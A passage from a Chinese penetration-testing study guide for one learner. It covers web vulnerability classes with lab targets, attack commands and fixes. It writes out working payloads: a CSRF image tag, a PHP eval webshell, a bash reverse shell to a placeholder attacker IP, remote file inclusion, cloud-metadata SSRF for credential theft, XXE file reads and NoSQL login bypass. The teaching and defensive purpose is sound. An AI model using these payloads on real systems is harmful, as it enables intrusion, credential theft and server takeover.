  <img src="http://受害者DVWA地址/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" style="display:none;">
</body>
</html>
```

> **效果**：受害者已登录 DVWA，一旦访问这个恶意页面，浏览器会自动带 Cookie 发起改密码请求，密码被改成 `hacked`。

#### 3.3.4 常见问题排查

| 问题 | 原因 | 解决办法 |
|------|------|---------|
| 攻击不生效 | DVWA 高难度加了 token 校验 | 低难度练习，理解原理后再学如何绕过 token |
| 浏览器拦截跨站请求 | SameSite 属性生效 | 说明站点已防护，换其他场景 |

#### 3.3.5 防护与修复方案

1. **CSRF Token**：表单里加随机 token，服务器校验。

```php
// 生成并校验 CSRF Token（示意）
$_SESSION['csrf_token'] = bin2hex(random_bytes(32));  // 存到 session
// 表单里输出 <input type="hidden" name="csrf_token" value="...">
// 提交时校验 $_POST['csrf_token'] === $_SESSION['csrf_token']
// 讲解：攻击者无法预知这个随机 token，所以伪造的请求会校验失败。
```

2. **SameSite Cookie**：设置 `SameSite=Strict` 或 `Lax`，禁止跨站自动携带。

```php
setcookie("session", $value, ["samesite" => "Strict"]);
// 讲解：SameSite=Strict 时，跨站请求不会带这个 Cookie。
```

3. **校验 Referer / Origin**：检查请求来源是否为本站。
4. **关键操作二次验证**：改密码、转账等要求再次输入密码或验证码。

#### 3.3.6 仍需深入的方向（进阶）

| 方向 | 说明 |
|------|------|
| **Token 绕过实战** | 你已理解绕过思路（先请求拿 Token 再发 CSRF），需动手实现完整跨站取 Token 的 PoC |
| **Login CSRF** | 诱导用户登录到攻击者账号，进而窃取用户行为数据 |
| **JSON CSRF** | 通过 form 提交 JSON 内容类型绕过 |

---

### 3.4 SSRF 服务端请求伪造

> **手册文档**：`exp/EXP-SSRF.md`
>
> **📌 你的进度**：你已通过第 11 周学习掌握 SSRF 原理、内网探测思路，以及 dict/gopher 协议打 Redis 的概念。但实战利用（gopher 构造 payload 写 Redis 计划任务）和 PortSwigger 对应实验尚需完成。

#### 3.4.1 原理

**一句话**：让服务器帮你去请求攻击者指定的 URL，从而访问内网资源。

**通俗比喻**：有些网站有"从指定 URL 加载图片"的功能。攻击者把这个 URL 改成内网地址（如 `http://127.0.0.1:6379`），服务器就会替你去访问自己内网的服务，这些内网服务原本是外部访问不到的。

**成立条件**（手册速查矩阵）：
- 服务端可控请求目标
- 可访问内部资源

#### 3.4.2 靶场定位

- 用 Pikachu 靶场的 SSRF 关卡（见第 6 章），或本地搭建

#### 3.4.3 完整命令

```bash
# 场景：某网站有"加载远程图片"功能，URL 参数可控
# 正常请求：
curl "http://target.com/load?url=http://example.com/img.jpg"
# 讲解：服务器会去请求 url 指向的地址，加载图片。

# SSRF 攻击：探测内网端口
curl "http://target.com/load?url=http://127.0.0.1:80"
# 讲解：让服务器请求自己的 80 端口。返回结果不同，可判断端口是否开放。

# 探测内网常见服务
curl "http://target.com/load?url=http://127.0.0.1:6379"    # Redis
curl "http://target.com/load?url=http://127.0.0.1:3306"    # MySQL
curl "http://target.com/load?url=file:///etc/passwd"        # 读取本地文件（file 协议）
# 讲解：file:// 协议可以读取服务器本地文件，这是 SSRF 的常见利用手法。
```

**云环境 SSRF（进阶）**：云主机有元数据接口 `http://169.254.169.254/`，SSRF 可以窃取云凭证。

```bash
# 阿里云/腾讯云等元数据地址（拿到 access key 后可直接控制云资源）
curl "http://target.com/load?url=http://169.254.169.254/latest/meta-data/"
```

#### 3.4.4 常见问题排查

| 问题 | 原因 | 解决办法 |
|------|------|---------|
| 请求被拒 | 目标有 SSRF 过滤（黑名单） | 学习绕过：用 `http://127.1`、短链接、DNS 重绑定等 |
| 不知道内网结构 | 缺乏信息 | 先扫常见端口（22/80/6379/3306/8080） |

#### 3.4.5 防护与修复方案

1. **白名单校验**：只允许请求预定义的域名/IP，而不是黑名单。
2. **禁用危险协议**：禁止 `file://`、`gopher://`、`dict://` 等协议。
3. **限制目标**：禁止访问内网 IP 段（127.0.0.0/8、10.0.0.0/8、172.16.0.0/12、192.168.0.0/16、169.254.0.0/16）。
4. **网络隔离**：把发起请求的服务放在无法访问内网的网络区域。

---

### 3.5 文件上传漏洞

> **手册文档**：`exp/EXP-Upload.md`、`exp/EXP-Upload-JSP.md`
>
> **📌 你的进度**：你已通过 Upload-labs 前 15 关掌握前端 JS 绕过、MIME 绕过、黑名单后缀绕过（大小写/双写/空格/点）、.htaccess 绕过，并能用蚁剑连接 webshell。仍需深入解析漏洞（Apache/Nginx/IIS）、内容校验绕过、图片马。

#### 3.5.1 原理

**一句话**：服务器对上传的文件校验不严，导致攻击者上传可执行的脚本（webshell）。

**通俗比喻**：网站允许你上传头像，但没检查文件类型，于是你上传了一个"能执行命令的 PHP 文件"当头像，服务器把头像目录里的这个 PHP 文件当程序执行了，你就拿到了服务器的命令权限。

#### 3.5.2 靶场定位

- **DVWA → File Upload**
- **upload-labs**（专项靶场，从 Pass-1 到 Pass-21 逐步加难度，强烈推荐）

#### 3.5.3 完整命令

**第一步：准备一个 webshell**

```php
<?php
// 一句话木马：接收 cmd 参数并执行系统命令
@eval($_POST['cmd']);
?>
```

```bash
# 用 echo 生成 webshell 文件
echo '<?php @eval($_POST["cmd"]);?>' > shell.php
# 讲解：echo 把内容写入文件，> 是重定向符号，shell.php 是文件名。
#       @eval() 执行传入的 PHP 代码，$_POST["cmd"] 接收 POST 参数 cmd。
```

**第二步：上传与绕过**

| 绕过场景 | 方法 | 说明 |
|---------|------|------|
| 只校验前端 | 改文件扩展名绕过 | 前端 JS 校验可被 Burp 拦截修改 |
| 校验 Content-Type | 改成 `image/jpeg` | 用 Burp 改请求头 |
| 校验扩展名黑名单 | 用 `.phtml`、`.php5`、`.pht` 等 | 服务器可能把这些也当 PHP 执行 |
| 校验扩展名白名单 | 用 `shell.php.jpg`、大小写 `shell.Php`、双写 `shell.pphphp` | 各平台解析差异 |
| 校验文件内容 | 图片马 + 配合文件包含 | 在图片末尾追加 PHP 代码 |

**用 Burp 改包上传（核心操作）**：

```
1. 打开 Burp 拦截上传请求
2. 修改 filename="shell.php" 为 filename="shell.phtml"
3. 或修改 Content-Type: application/octet-stream 为 Content-Type: image/jpeg
4. Forward 放行
```

**第三步：访问并执行 webshell**

```bash
# 上传成功后，用 curl 访问并执行命令
curl -X POST "http://target.com/upload/shell.php" -d "cmd=system('id');"
# 讲解：POST 请求到 webshell，cmd 参数传入 system('id')，执行 id 命令查看身份。
# 效果：返回当前用户信息（如 uid=33(www-data)），说明拿到命令执行权限。
```

**用蚁剑/冰蝎连接**：图形化工具，填入 webshell 地址和密码（如 `cmd`），即可可视化操作文件系统。

#### 3.5.4 常见问题排查

| 问题 | 原因 | 解决办法 |
|------|------|---------|
| 上传报错"文件类型不允许" | 扩展名/Content-Type 被校验 | 按上表逐级尝试绕过 |
| 上传成功但访问 404 | 上传目录不可执行，或路径错误 | 找对上传路径；确认目录是否解析 PHP |
| webshell 不执行 | 服务器过滤了 `<?php` | 尝试短标签 `<?=` 或编码绕过 |

#### 3.5.5 防护与修复方案

1. **白名单扩展名**：只允许 `jpg/png/gif` 等图片类型。
2. **校验文件真实内容**：用文件头（magic bytes）判断，而非扩展名。
3. **重命名文件**：上传后随机重命名，去掉用户可控的文件名。
4. **存储目录与执行隔离**：上传目录禁止执行脚本（如 Nginx 配置该目录不解析 PHP）。
5. **限制大小 + 杀毒扫描**。

```nginx
# Nginx 禁止上传目录执行 PHP
location /upload/ {
    location ~ \.php$ { deny all; }
}
# 讲解：upload 目录下的 .php 文件一律拒绝访问，即使上传了 webshell 也无法执行。
```

---

### 3.6 命令注入 & 代码执行

> **手册文档**：`exp/EXP-CI-PHP.md`、`exp/EXP-CI-Java.md`
>
> **📌 你的进度**：你已通过 DVWA Command Injection + 第 10 周学习掌握命令拼接符（`; && | ||`）、sleep 延迟盲注、空格（`$IFS`）和关键字（`who""ami`）绕过。仍需深入反弹 shell 实战和 DNS 外带无回显场景。

#### 3.6.1 原理

**一句话**：用户输入被拼进系统命令或解释器执行。

**通俗比喻**：网站有个"ping 一个地址"的功能，你输入 `127.0.0.1` 它会执行 `ping 127.0.0.1`。但你输入 `127.0.0.1; id`，它就执行了 `ping 127.0.0.1; id`，`;` 后面的 `id` 命令也被执行了。

#### 3.6.2 靶场定位

- **DVWA → Command Injection**

#### 3.6.3 完整命令

```bash
# 正常功能测试
curl "http://localhost/dvwa/vulnerabilities/exec/?ip=127.0.0.1&Submit=Submit"
# 讲解：正常输入 IP，服务器执行 ping 命令并返回结果。

# 注入分号 + 额外命令
curl "http://localhost/dvwa/vulnerabilities/exec/?ip=127.0.0.1;id&Submit=Submit"
# 讲解：; 是 shell 命令分隔符，id 是查看当前用户的命令。
#      服务器实际执行 ping 127.0.0.1; id，两条命令都会执行。
# 效果：返回 ping 结果 + 当前用户信息。

# 常用分隔符（不同系统支持不同）
;   # 分号：顺序执行
&&  # 前一条成功才执行后一条
||  # 前一条失败才执行后一条
|   # 管道：把前一条输出传给后一条
`   # 反引号：命令替换
$() # 命令替换
```

```bash
# 进阶：读取敏感文件
curl "http://localhost/dvwa/vulnerabilities/exec/?ip=127.0.0.1;cat%20/etc/passwd&Submit=Submit"
# 讲解：cat /etc/passwd 读取用户账号文件，%20 是空格的 URL 编码。
# 效果：返回服务器所有用户信息。

# 进阶：反弹 shell（拿到交互式控制）
# 攻击机（Kali）先监听：
nc -lvnp 4444
# 讲解：nc 是网络工具，-l 监听，-v 详细输出，-n 不做域名解析，-p 指定端口 4444。
#      这是让攻击机在 4444 端口等待连接。

# 目标机注入反弹 shell 命令：
curl "http://localhost/dvwa/vulnerabilities/exec/?ip=127.0.0.1;bash%20-i%20>%26%20/dev/tcp/攻击者IP/4444%200>%261&Submit=Submit"
# 讲解：bash -i 启动交互式 bash，> /dev/tcp/攻击者IP/4444 把 shell 的输出
#      重定向到攻击机的 4444 端口，实现"反弹"。攻击机 nc 监听的端口就能拿到 shell。
```

#### 3.6.4 常见问题排查

| 问题 | 原因 | 解决办法 |
|------|------|---------|
| 注入不生效 | 有过滤 | 尝试不同分隔符，或编码绕过 |
| 反弹 shell 失败 | 目标无 bash / 端口不通 | 换 `nc -e`、`python` 反弹；确认端口可达 |
| 命令无回显 | 盲注场景 | 用 DNS 外带（dnslog）判断命令是否执行 |

#### 3.6.5 防护与修复方案

1. **避免用 shell 执行**：能用 API/库实现的功能，不要拼 shell 命令。
2. **参数白名单**：ping 功能只允许输入 IP 格式，用正则校验。
3. **参数数组化**（Java/Python 等）：不要把整个命令当字符串，用参数数组传递。

```java
// ❌ 错误：字符串拼接（可注入）
Runtime.getRuntime().exec("ping " + ip);

// ✅ 正确：参数数组（ip 不会被当成 shell 语法解析）
Runtime.getRuntime().exec(new String[]{"ping", ip});
```

4. **最小权限**：Web 进程用低权限账号运行，限制其能执行的命令。

---

### 3.7 XXE 外部实体注入

> **手册文档**：`exp/EXP-XXE.md`
>
> **📌 你的进度**：你已通过第 11 周掌握 XXE 外部实体读取文件的基础 payload。仍需深入盲 XXE、SSRF 型 XXE、参数实体等进阶利用。

#### 3.7.1 原理

**一句话**：XML 解析器配置不当，攻击者通过外部实体读取文件或发起 SSRF。

**通俗比喻**：XML 可以定义一个"实体"（相当于变量），引用外部资源。如果解析器允许"外部实体"，攻击者就能定义一个实体指向 `/etc/passwd`，然后在 XML 里引用它，服务器解析时就把文件内容读出来了。

#### 3.7.2 靶场定位

- **Pikachu → XXE**，或 DVWA 的 XXE（部分版本有）

#### 3.7.3 完整命令

```xml
<!-- XXE 攻击 payload：读取 /etc/passwd -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

```bash
# 用 curl 发送 XXE payload（假设接口接收 XML）
curl -X POST "http://target.com/xxe" -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
# 讲解：-X POST 用 POST 方法，-H 设置请求头为 XML 类型，-d 发送 XML 数据。
#       DOCTYPE 定义了一个外部实体 xxe，指向 file:///etc/passwd。
#       <foo>&xxe;</foo> 引用这个实体，服务器解析时会替换成文件内容。
# 效果：响应中返回 /etc/passwd 的文件内容，实现任意文件读取。
```

```xml
<!-- XXE 进阶：内网探测（SSRF 效果） -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">
]>
```

#### 3.7.4 常见问题排查

| 问题 | 原因 | 解决办法 |
|------|------|---------|
| 文件读不到 | 解析器禁用了外部实体 | 说明已修复，换其他漏洞测试 |
| 报错解析失败 | XML 格式问题 | 检查 payload 的 XML 语法是否完整 |

#### 3.7.5 防护与修复方案

1. **禁用外部实体**：配置解析器关闭 DTD 和外部实体。

```java
// Java 修复 XXE（关键代码）
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);  // 禁止 DOCTYPE
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false); // 禁止外部实体
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

2. **升级解析器**：使用安全默认配置的新版本。
3. **输入校验**：如果不需要 XML，就不用 XML 解析。

---

### 3.8 SSTI 模板注入

> **手册文档**：`exp/EXP-SSTI-ALL.md`、`exp/EXP-SSTI-Python.md`、`exp/EXP-SSTI-PHP.md`、`exp/EXP-SSTI-Java.md`、`exp/EXP-SSTI-Node.md`
>
> **📌 你的进度**：尚未学习。建议在你已有的 Pikachu 靶场或 Vulhub 的 Flask SSTI 环境中练习，从 Jinja2 入手。

#### 3.8.1 原理

**一句话**：用户输入被当成模板表达式执行，导致任意代码执行。

**通俗比喻**：网站用模板引擎渲染"欢迎你，{{username}}"。如果 username 是用户可控的，攻击者输入的不是普通名字，而是一段模板表达式（如 `{{7*7}}`），模板引擎就会执行它，返回 `49`。进一步可利用模板语法执行系统命令。

#### 3.8.2 靶场定位

- 用 Python 搭建 Flask + Jinja2 的 SSTI 靶场，或 Pikachu 的 SSTI 关卡

#### 3.8.3 完整命令（以 Jinja2 为例）

```bash
# 检测是否存在 SSTI
curl "http://target.com/hello/{{7*7}}"
# 讲解：{{7*7}} 是 Jinja2 模板表达式。如果存在 SSTI，模板引擎会执行 7*7。
# 效果：页面显示 49 而不是字面的 {{7*7}}，说明存在 SSTI。

# 进阶：读取配置文件（Jinja2 常见 payload）
curl "http://target.com/hello/{{config}}"
# 讲解：config 是 Flask 内置对象，包含敏感配置（如 SECRET_KEY）。
# 效果：返回 Flask 的配置信息，可能包含密钥。

# 进阶：执行系统命令（构造 payload，逐层访问内置对象）
# 这是最经典的 Jinja2 RCE payload，原理是顺着 Python 的类继承链找到 os 模块：
curl "http://target.com/hello/{{''.__class__.__mro__[2].__subclasses__()}}"
# 讲解：__class__ 获取空字符串的类（str），__mro__ 是其继承链，
#       __subclasses__() 列出所有子类，其中包含 os 相关类，进一步可执行命令。
```

> **说明**：SSTI 的 RCE payload 较长且因环境而异，完整利用建议查阅 `exp/EXP-SSTI-Python.md` 原文和 [payloadbox/ssti-payloads](https://github.com/payloadbox/ssti-payloads)。

#### 3.8.4 防护与修复方案

1. **不要用模板处理用户输入**：用户输入只作为数据传入，不作为模板字符串。
2. **沙箱**：使用模板引擎的沙箱模式（如 Jinja2 SandboxedEnvironment）。
3. **最小权限**：限制模板可访问的对象和函数。

---

### 3.9 文件包含 / 任意文件读取

> **手册文档**：`exp/EXP-Include-PHP.md`、`exp/EXP-FileRead.md`
>
> **📌 你的进度**：你已通过 DVWA File Inclusion + 第 9 周掌握 LFI/RFI、php://filter 读源码、日志包含 getshell。仍需深入 data://、php://input、session 文件包含等伪协议利用。

#### 3.9.1 原理

**一句话**：程序用可控参数去包含/读取文件，导致读取敏感文件或执行恶意代码。

**分类**：

| 类型 | 说明 | 危害 |
|------|------|------|
| **本地文件包含（LFI）** | 包含服务器本地文件 | 读源码、读敏感文件、配合上传 getshell |
| **远程文件包含（RFI）** | 包含远程文件 | 直接执行远程恶意代码 |
| **任意文件读取** | 读取任意文件 | 读配置、读密码、读源码 |

#### 3.9.2 靶场定位

- **DVWA → File Inclusion**
- **Pikachu → 文件包含**

#### 3.9.3 完整命令

```bash
# 本地文件包含（DVWA low）
curl "http://localhost/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd"
# 讲解：page 参数可控，../ 表示上一级目录，连续多个 ../ 回到根目录，
#       再访问 etc/passwd。服务器 include 这个文件，就读取了密码文件。
# 效果：返回 /etc/passwd 内容。

# 远程文件包含（RFI，需 allow_url_include 开启）
curl "http://localhost/dvwa/vulnerabilities/fi/?page=http://攻击者IP/shell.txt"
# 讲解：page 指向远程的一个文件，服务器会包含并执行它。
#       shell.txt 内容是 <?php @eval($_POST['cmd']);?>，实现 getshell。
```

```bash
# 目录穿越读取（任意文件读取，典型）
curl "http://target.com/download?file=../../../../etc/passwd"
# 讲解：download 接口按 file 参数读文件，.. 穿越到根目录读取 passwd。
```

#### 3.9.4 防护与修复方案

1. **白名单**：包含的文件只能用预定义列表（如 `page=home` 映射到固定文件）。
2. **禁用远程包含**：PHP 关闭 `allow_url_include`。
3. **过滤路径**：过滤 `../`、`..\\` 等穿越字符，或用 `basename()` 提取文件名。
4. **限制目录**：文件读取限制在指定目录内。

```php
// 修复文件包含（PHP 白名单示例）
$allowed = ['home' => 'home.php', 'about' => 'about.php'];
if (isset($allowed[$page])) {
    include($allowed[$page]);
} else {
    include('home.php');
}
// 讲解：只允许包含白名单里的固定文件，用户无法控制实际文件路径。
```

---

### 3.10 反序列化漏洞

> **手册文档**：`exp/EXP-PHP-Unserialize.md`、`exp/EXP-Java-Unserialize.md`、`exp/EXP-Python-Unserialize.md`、`exp/EXP-DotNet-Unserialize.md`
>
> **📌 你的进度**：尚未学习。这是 Web 安全难度较高的漏洞，建议在学完前面基础漏洞、且具备一定 PHP/Java 基础后再深入。

#### 3.10.1 原理

**一句话**：程序对不可信数据做反序列化，触发恶意代码执行。

**通俗比喻**：序列化是把对象变成字符串保存/传输，反序列化是把字符串还原成对象。如果攻击者能控制这个字符串，就能构造一个"一还原就执行恶意代码"的对象（利用 gadget 链）。

> **注意**：这是 Web 安全里难度较高的漏洞，建议学完前面的基础漏洞后再深入。手册里 PHP/Java/Python/.NET 各有专门文档。

#### 3.10.2 靶场定位

- **PHP 反序列化**：Pikachu、DVWA（部分版本）
- **Java 反序列化**：用 ysoserial + Vulhub 靶场（见第 6 章）

#### 3.10.3 完整命令（PHP 为例）

```php
<?php
// 存在漏洞的代码：接收序列化数据并反序列化
class Test {
    function __destruct() {
        system($this->cmd);   // 析构时执行系统命令
    }
}
$data = unserialize($_GET['data']);  // 反序列化用户输入
?>
```

```bash
# 攻击者构造恶意序列化数据（让 cmd 属性为恶意命令）
# 序列化后的 payload 形如：
# O:4:"Test":1:{s:3:"cmd";s:2:"id";}
curl "http://target.com/vul.php?data=O:4:%22Test%22:1:%7Bs:3:%22cmd%22%3Bs:2:%22id%22%3B%7D"
# 讲解：这是 PHP 序列化格式，O 表示对象，4 是类名长度，Test 是类名，
#       1 是属性数量，s:3:"cmd" 是属性名，s:2:"id" 是属性值。
#       %22 是双引号的 URL 编码，%7B/%7D 是花括号。
# 效果：unserialize 还原对象，__destruct 析构时执行 system("id")。
```

#### 3.10.4 防护与修复方案

1. **不要反序列化不可信数据**：这是最根本的修复。
2. **白名单类**：限制允许反序列化的类。
3. **完整性校验**：反序列化前做签名/HMAC 校验，防止数据被篡改。
4. **Java**：升级到禁用危险 gadget 的 JDK 版本，使用 `ObjectInputFilter`。

---

### 3.11 越权（IDOR / 访问控制缺失）

> **手册文档**：`exp/EXP-IDOR.md`
>
> **📌 你的进度**：尚未系统学习，但你已在 DVWA 中接触过 IDOR 关卡。这是挖 SRC 漏洞时最常见、最高危的一类，建议优先学习，用 DVWA IDOR + Pikachu 越权关卡练习，配合手册「双账号对比法」。

#### 3.11.1 原理

**一句话**：程序只验证了"是否登录"，没验证"数据是否属于你"。

**分类**：

| 类型 | 说明 | 例子 |
|------|------|------|
| **水平越权** | 访问同级别的别人的数据 | 把订单号 1001 改成 1002，看到别人的订单 |
| **垂直越权** | 低权限访问高权限功能 | 普通用户访问管理员接口 |

**手册金句**：*认证 ≠ 授权*。认证是"你是谁"，授权是"你能干什么"。

#### 3.11.2 靶场定位

- **DVWA → Insecure Direct Object References（IDOR）**
- **Pikachu → 越权漏洞**

#### 3.11.3 完整命令

```bash
# DVWA IDOR 关卡：URL 里带用户标识
curl "http://localhost/dvwa/vulnerabilities/idor/?id=1"
# 讲解：id 参数指定要查看的用户资料。正常只能看自己的。

# 越权攻击：改成别人的 id
curl "http://localhost/dvwa/vulnerabilities/idor/?id=2"
# 讲解：把 id 从 1 改成 2，如果程序没校验"id=2 是否属于当前登录用户"，
#       就能看到 id=2 用户的资料，这就是水平越权。
# 效果：返回另一个用户的敏感信息。
```

```bash
# 垂直越权：低权限用户访问管理接口
curl "http://target.com/admin/delete_user.php?id=5" -H "Cookie: session=普通用户"
# 讲解：delete_user.php 是管理员接口，但如果它只检查"是否登录"而不检查"是否管理员"，
#       普通用户带上自己的 Cookie 也能调用，实现垂直越权。
```

#### 3.11.4 防护与修复方案

1. **服务端校验资源归属**：每个接口都验证"这个资源是否属于当前用户"。

```php
// 修复 IDOR：校验资源归属
$order = Order::find($id);
if ($order->user_id != $current_user_id) {
    die("无权访问");  // 不是你的数据就拒绝
}
```

2. **不要用可预测的 ID**：使用 UUID 等不可预测的标识。
3. **服务端做权限校验**：每个接口都做角色/权限校验，不能只靠前端隐藏按钮。

---

### 3.12 JWT 攻击

> **手册文档**：`exp/EXP-JWT.md`
>
> **📌 你的进度**：尚未学习。现代前后端分离应用中 JWT 很常见，是值得优先掌握的认证类漏洞。

#### 3.12.1 原理

**一句话**：JWT 签名算法、密钥或声明校验存在缺陷，导致可伪造身份令牌。

**JWT 结构**：`Header.Payload.Signature`（三部分用点分隔，Base64 编码）

**常见攻击**（手册速查）：
- `alg=none`：把签名算法改成 none，绕过签名校验
- 算法混淆：把 RS256 改成 HS256，用公钥当密钥签名
- 弱密钥：暴力破解 HMAC 密钥
- `kid` 注入：kid 参数可控导致任意文件读取/SQL 注入

#### 3.12.2 完整命令

```bash
# 用 jwt_tool 检测 JWT 漏洞
# 安装
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
python3 jwt_tool.py <JWT字符串>
# 讲解：jwt_tool 是 JWT 安全测试工具，会自动检测各种已知漏洞。
# 效果：输出该 JWT 存在的风险点。

# 用 hashcat 爆破弱密钥
hashcat -m 16500 jwt.txt wordlist.txt
# 讲解：hashcat 是密码破解工具，-m 16500 是 JWT 的哈希类型，
#       jwt.txt 存放 JWT，wordlist.txt 是字典。
# 效果：若密钥较弱，能被爆破出来，然后用它伪造任意身份的 JWT。
```

#### 3.12.3 防护与修复方案

1. **强制指定算法**：服务端固定算法，不信任 Header 里的 alg 字段。
2. **强密钥**：HMAC 密钥用足够长的随机值，定期轮换。
3. **校验所有声明**：校验 `exp`（过期）、`aud`（受众）等所有必要字段。

---

### 3.13 其他补充漏洞

> **手册文档**：`exp/EXP-NoSQL.md`、`exp/EXP-Request-Smuggling.md`、`exp/EXP-CRLF.md`、`exp/EXP-HPP.md`、`exp/EXP-Cache-Poisoning.md`、`exp/EXP-GraphQL.md`、`exp/EXP-CORS.md`、`exp/EXP-DNS-Rebinding.md`、`exp/EXP-InfoLeak.md`、`exp/EXP-Logic.md`
>
> **📌 你的进度**：尚未系统学习。其中「业务逻辑漏洞」「信息泄露」「CORS 误配」在挖 SRC 时价值很高，建议在掌握核心漏洞后优先补这几个。

以下漏洞建议掌握原理和识别方法，深入利用可查阅对应手册文档：

| 漏洞 | 一句话原理 | 常见场景 |
|------|-----------|---------|
| **NoSQL 注入** | 参数被解析为查询对象（`$ne`/`$regex`） | MongoDB 后端 |
| **HTTP 请求走私** | 前后端对 CL/TE 解析不一致 | 有 CDN/反向代理 |
| **CRLF 注入** | 换行符进响应头，拆分响应 | 参数拼进响应头 |
| **HTTP 参数污染** | 参数重复提交，各层取值不一致 | 绕 WAF、绕鉴权 |
| **缓存投毒** | unkeyed 输入 + 缓存键不完整 | CDN 缓存场景 |
| **GraphQL** | 内省开放 + 接口拼装暴露 | GraphQL API |
| **CORS 误配** | 服务器过度信任来源 | 跨域配置 `*` 或反射 Origin |
| **信息泄露** | 源码/配置/接口文档泄露 | 攻击链第一步 |
| **业务逻辑漏洞** | 条件竞争、支付篡改、验证码缺陷 | 支付、优惠券、密码重置 |

**NoSQL 注入示例**：

```bash
# MongoDB 场景：参数是 JSON，用 $ne（不等于）绕过
curl -X POST "http://target.com/login" -H "Content-Type: application/json" \
  -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'
# 讲解：$ne 是 MongoDB 的"不等于"操作符。这里让 username 和 password
#       都不等于空字符串（恒真），绕过认证。
# 效果：无需正确密码即可登录。
```

---

## 第 4 章 代码审计篇

> **手册文档**：`ReAbout/audit-php`、`ReAbout/audit-java`，以及多个社区审计资源。
>
> **📌 你的进度**：尚未开始代码审计。不过你有 C 语言基础和 Web 前端基础，且已能读懂 PHP 靶场源码（如第五周改靶场源码解决 PHP8 报错），具备入门条件。建议在完成第 3 章核心漏洞后开始，从 PHP 危险函数审计入手。

### 4.1 为什么要学代码审计

学完漏洞利用后，代码审计能让你**从源码层面主动发现漏洞**，这是从"会用工具"到"能挖洞"的关键跨越。也是挖 SRC（安全应急响应中心）漏洞、拿赏金的核心能力。

### 4.2 学习路径

| 阶段 | 语言 | 内容 | 资源 |
|------|------|------|------|
| 入门 | PHP | 理解危险函数（`eval`/`system`/`include`/`unserialize`/`$_GET`拼接SQL） | `ReAbout/audit-php` |
| 进阶 | Java | 理解 SSRF、反序列化、表达式注入 | `ReAbout/audit-java`、`Y4tacker/JavaSec` |
| 拓展 | .NET / Perl | 按需 | `Ivan1ee/NET-Deserialize` |

### 4.3 PHP 危险函数速查（审计重点）

| 危险函数 | 对应漏洞 |
|---------|---------|
| `eval()` / `assert()` | 代码执行 |
| `system()` / `exec()` / `shell_exec()` / `passthru()` | 命令执行 |
| `include()` / `require()` | 文件包含 |
| `unserialize()` | 反序列化 |
| `$_GET`/`$_POST` 直接拼 SQL | SQL 注入 |
| `echo` 未过滤输出 | XSS |
| `file_get_contents()` 参数可控 | SSRF / 文件读取 |

### 4.4 审计思路（四步法）

1. **找入口**：定位所有用户输入点（`$_GET`、`$_POST`、`$_REQUEST`、`$_COOKIE`）。
2. **追数据流**：追踪输入如何传递到危险函数（sink）。
3. **判断过滤**：检查传递过程中是否有充分的过滤/校验。
4. **构造 payload**：绕过过滤，构造可利用的输入。

---

## 第 5 章 渗透测试全流程篇

> **手册文档**：`penetration/` 目录下全套流程。这是从"单个漏洞"到"完整实战"的进阶。
>
> **📌 你的进度**：你已通过《第三部分-渗透测试实战操作流程》掌握了**信息收集**（whois/子域名枚举/nmap/dirsearch/whatweb/wpscan）、**中间件与 CMS 漏洞**（Apache/Nginx 解析漏洞、Tomcat 弱口令、WordPress）、**反弹 shell 多种写法**，并计划用 Vulnhub 靶机（Kioptrix、Mr-Robot、Stapler）做完整实战。仍需深入：**Linux 提权实战、内网横向、隧道代理、后渗透、渗透报告撰写**。

### 5.1 渗透测试标准流程（手册原文）

```
网络预置（准备&信息收集）
  → 网络接入（外网突破）
  → 权限获取和提升
  → 权限维持（后门）
  → 后渗透
基础：免杀 +++ 反溯源 +++ 协同
```

### 5.2 各阶段要点与工具

| 阶段 | 核心任务 | 关键工具/文档 |
|------|---------|--------------|
| **信息收集** | 子域名、端口、指纹、资产 | Nmap、fscan、FOFA/Shodan、`PEN-Info.md` |
| **漏洞验证** | 扫描、验证漏洞 | AWVS、Xray、Burp、`PEN-Scanner.md` |
| **漏洞利用** | 突破外网 | 各 exp 文档、OA/框架工具 |
| **权限提升** | Windows/Linux 提权 | mimikatz、lse.sh、`PEN-Win-LPE.md`、`PEN-Linux-LPE.md` |
| **权限维持** | 后门、webshell | 蚁剑/冰蝎/哥斯拉、`PEN-ReShell.md` |
| **横向移动** | 内网拓展 | impacket、`PEN-Lateral.md` |
| **隧道代理** | 打通内网 | frp、chisel、`PEN-Tunnel.md` |
| **痕迹清理** | 反溯源 | `PEN-WinClear.md`、`PEN-LinuxClear.md` |

### 5.3 常用命令（信息收集 + 提权示例）

```bash
# 端口扫描（Nmap）
nmap -sV -sC 192.168.1.10
# 讲解：-sV 探测服务版本，-sC 使用默认脚本扫描。
# 效果：列出目标开放的端口及运行的服务。

# 内网快速扫描（fscan）
fscan -h 192.168.1.0/24
# 讲解：fscan 是 Go 写的内网扫描神器，-h 指定目标网段。
# 效果：快速发现网段内存活主机、开放端口和常见漏洞。

# Linux 提权检测（lse.sh）
curl -sL https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh -o lse.sh
chmod +x lse.sh && ./lse.sh -l 1
# 讲解：lse.sh 是 Linux 提权检测脚本，-l 1 是详细检测级别。
# 效果：列出系统可能存在的提权点（SUID、计划任务、弱配置等）。
```

> **⚠️ 合规提醒**：渗透测试全流程操作**仅限授权环境**（自己搭建的靶场、CTF、或获得书面授权的目标）。对未授权目标进行扫描/攻击属于违法行为。

---

## 第 6 章 靶场与练习平台清单

### 6.1 本地靶场（配合你已有的 DVWA / sqli-labs）

| 靶场 | 覆盖漏洞 | 难度 | 部署方式 |
|------|---------|------|---------|
| **DVWA** ✅ | SQLi/XSS/CSRF/上传/命令执行/文件包含/IDOR | 入门 | 已搭建并通关 |
| **sqli-labs** ✅ | SQL 注入专项（65 关） | 入门→进阶 | 已搭建，前 20 关已完成 |
